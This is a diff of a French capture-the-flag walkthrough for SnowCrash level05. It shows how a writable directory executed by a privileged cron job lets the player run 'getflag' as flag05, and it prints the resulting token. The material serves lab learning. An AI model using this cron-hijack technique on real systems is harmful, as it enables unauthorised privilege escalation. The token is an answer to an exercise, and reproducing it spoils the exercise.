@@ -1,14 +1,28 @@
 # LEVEL05
 
+Lorsque l'on se connecte au level05 "You have new mail" s'affiche sur stdout:
+
 ``` bash
+➜  ~ ssh level05@192.168.56.101 -p 4242
+	   _____                      _____               _     
+	  / ____|                    / ____|             | |    
+	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
+	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
+	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
+	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
+                                                        
+  Good luck & Have fun
+
+          192.168.56.101 
 level05@192.168.56.101's password: 
-You have new mail.
-level05@SnowCrash:~$ 
+You have new mail
 ```
 
-Recherche d'un "mail" dans le dossier var
+On va chercher dans le dossier ```/var```. Ce dossier est destiné aux fichiers dont le contenu ou la taille évolue, on y trouve les données dynamiques du système (contrairement à /usr et /bin qui contiennent des fichiers statiques).
 
-``` bash
+On y trouve notamment les logs, le cache, les spools (les files d'attente pour l'impression ou les mails sortants). Les mails sont aussi traditionnellement dans le dossier ```/var/mail```, c'est l'emplacement standard pour les boites de réception locales des utilisateurs sur un système Unix/Linux.
+
+``` diff
 level05@SnowCrash:/$ cd var
 level05@SnowCrash:/var$ ls -la
 total 0
@@ -21,13 +35,17 @@ drwxr-xr-x 1 root root     180 Mar 17 10:47 lib
 drwxrwsr-x 2 root staff      3 Apr 19  2012 local
 lrwxrwxrwx 1 root root       9 Aug 29  2015 lock -> /run/lock
 drwxr-xr-x 1 root root     300 Mar 17 10:47 log
-drwxrwsr-x 1 root mail      60 Mar  5  2016 mail
++drwxrwsr-x 1 root mail      60 Mar  5  2016 mail
 drwxr-xr-x 2 root root       3 Aug 29  2015 opt
 lrwxrwxrwx 1 root root       4 Mar 12  2016 run -> /run
 drwxr-xr-x 5 root root      70 Aug 29  2015 spool
 d-wx-wx-wx 1 root root      40 Mar  5  2016 tmp
 drwxr-xr-x 1 root root     100 Mar 17 10:47 www
+```
 
+En examinant le dossier mail on y trouve un fichier level05 qui contient un crontab.
+
+``` bash
 level05@SnowCrash:/var$ cd mail
 level05@SnowCrash:/var/mail$ ls
 level05
@@ -35,32 +53,16 @@ level05@SnowCrash:/var/mail$ cat level05
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 
 ```
-On est face a une commande crontab
-`*/2 * * * *` : commande executee toutes les 2 minutes
-`- flag05` : commande executee sous l'identite de flag05
-`sh /usr/sbin/openarenaserver` le script execute
+En décomposant la commande crontab on comprend que que le script `sh /usr/sbin/openarenaserver` est exécutée toutes les 2 minutes avec les permissions de l'utilisateur flag05.
 
-
-Recherche du script en question:
+On va rechercher et afficher le script en question:
 
 ``` bash
-
-level05@SnowCrash:~$ find / -user flag05 2>/dev/null
-/usr/sbin/openarenaserver
-/rofs/usr/sbin/openarenaserver
-
 level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
 -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
-
-level05@SnowCrash:/usr/sbin$ ls -l /rofs/usr/sbin/openarenaserver
--rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
-
 ```
 
-Affichage du contenu du script:
-
 ``` bash
-
 level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
 #!/bin/sh
 
@@ -68,25 +70,18 @@ for i in /opt/openarenaserver/* ; do
 	(ulimit -t 5; bash -x "$i")
 	rm -f "$i"
 done
-
 ```
 
+Le script va créer un sous-shell (`( )`) pour chaque fichier dans le dossier `/opt/openarenaserver/` et exécuter son contenu avec bash en mode debug (`bash -x`), ce qui signifie que les commandes exécutées sont affichées. Les fichiers sont progressivement supprimés (`rm -f "$i"`).
+
+<!-- Pourquoi il y a ici:
 `ulimit -t 5` limite le temps CPU 
 temps pendant lequel le processus utilise reellement le CPU (processus == shell et commandes lancees)
-ici apres 5 secondes le kernel envoi SIGXCPU et tue le programme 
+ici apres 5 secondes le kernel envoi SIGXCPU et tue le programme  -->
 
-`(    )` cree un subshell, les changements ne modifient pas le shell parent
+Le script execute donc les fichiers présents dans /usr/sbin/openarenaserver.
 
-`bash -x` active le mode debug, les commandes executees sont affichees
-
-.sh
-
-Le script execute les fichiers presents dans /usr/sbin/openarenaserver
-Probleme, si le script est lance par le systreme en arriere plan, on ne verra pas le resultat sur le terminal.
-Comme le script est lance par le cron job le resultat nest pas dirige vers la sortie standard
-Il faut forcer une commande a ecrire son resultat dans un fichier quon pourra lire plus tard. Par ex dans /tmp/
-
-On regarde les permissions que l'on a sur le dossier openarenaserver:
+On cherche a savoir quels sont les permissions dans le dossier:
 
 ``` bash
 level05@SnowCrash:/opt/openarenaserver$ ls -la
@@ -95,17 +90,17 @@ drwxrwxr-x+ 2 root root 40 Mar  5 10:43 .
 drwxr-xr-x  1 root root 60 Mar  5 10:43 ..
 ```
 
-Le `+` sifnifie qu'il y a des precisions sur les permissions a regarder avec getfacl.
-ACL (Access Control Lists)
+En observant cette sortie l'utilisateur non root n'a le droit que de le lecture et d'execution.
+Mais le bit `+` signifie qu'il y a des précisions sur les permissions des ACL (Access Control Lists) à regarder avec `getfacl`. Ces précisions prévalent sur les permissions classiques, l'utilisateur level05 à donc les droits de lecture, d'écriture et d'exécution.
 
 
-``` bash
+``` diff
 level05@SnowCrash:/opt/openarenaserver$ getfacl .
 # file: .
 # owner: root
 # group: root
 user::rwx
-user:level05:rwx
++user:level05:rwx
 user:flag05:rwx
 group::r-x
 mask::rwx
@@ -119,9 +114,12 @@ default:other::r-x
 
 ```
 
-On a le droit sur les fichiers present dans le dossier
-On va donc creer un script pour recupere le token avec getflag, mais on ne peux pas mettre le resultat dans un fichier dans /opt/openarenaserver car le script supprime les fichiers presents dans le dossier des quil execute les scripts. On ne peux pas non plus executer  dans un fichier creer dans /tmp/
-Le fichier est cree avec les droits de flag05 (qui execute le script) et cree un fichier dans un dossier ou l'on a le droit de lire
+On va donc creer un script dans le dossier /opt/openarenaserver pour affficher le resultat de la commande getflag.
+
+De manière historique, les sorties des taches cron étaient envoyées par mail à l'utilisateur. Par défaut, le script est lancé ici en arrière plan, on ne verra donc pas son resultat sur la sortie standard. Nous allons donc rediriger le resultat de getflag dans un un autre fichier pour pouvoir le lire.
+
+On ne peux pas mettre le resultat dans /opt/openarenaserver car le script supprime chaque fichier présent dans le dossier juste après avoir executer le script. On va donc rediriger la sortie de la commande vers `/tmp/`. Le fichier crée le sera avec les permissions de flag05 qui est l'utilisateur qui exécute le script.
+
 ``` bash
 level05@SnowCrash:/opt/openarenaserver$ echo "getflag > /tmp/myfile" > script.sh
 level05@SnowCrash:/opt/openarenaserver$ cat /tmp/myfile
@@ -129,3 +127,5 @@ Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
 
 
+Sources:
+- https://blog.stephane-robert.info/docs/admin-serveurs/linux/cron/
